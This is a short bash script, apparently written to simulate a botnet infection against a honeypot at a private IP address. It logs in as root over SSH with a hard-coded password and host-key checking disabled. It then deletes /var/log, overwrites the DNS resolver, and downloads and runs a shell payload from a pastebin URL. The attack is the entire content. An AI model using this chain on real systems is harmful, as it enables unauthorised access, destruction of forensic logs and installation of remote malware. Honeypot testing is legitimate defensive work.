#!/bin/bash
HONEYPOT_IP="192.168.50.10"
PORT="22"
USER="root"
PASS="Welcome@123"
echo "Simulating automated botnet deployment..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -p $PORT
$USER@$HONEYPOT_IP << 'EOF'
uname -m
cat /proc/cpuinfo | grep name | head -n 1
rm -rf /var/log/*
echo "nameserver 8.8.8.8" > /etc/resolv.conf
cd /tmp
wget https://pastebin.com/raw/PA8S3BM6 -O payload.sh
chmod +x payload.sh
./payload.sh
exit
EOF
